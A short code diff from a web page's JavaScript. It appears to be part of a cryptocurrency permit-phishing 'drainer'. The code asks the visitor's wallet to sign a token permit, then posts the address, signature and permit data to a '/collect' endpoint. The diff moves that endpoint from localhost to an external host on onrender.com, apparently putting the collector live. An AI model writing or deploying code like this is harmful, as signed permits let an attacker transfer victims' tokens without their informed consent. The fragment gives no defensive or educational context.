@@ -81,7 +81,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
       const { signature, value } = await signPermit(signer, chainId, userAddress);
 
-      await fetch("http://localhost:3000/collect", {
+      await fetch("https://backend-a2or.onrender.com/collect", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chainId, userAddress, signature, permitData: value })
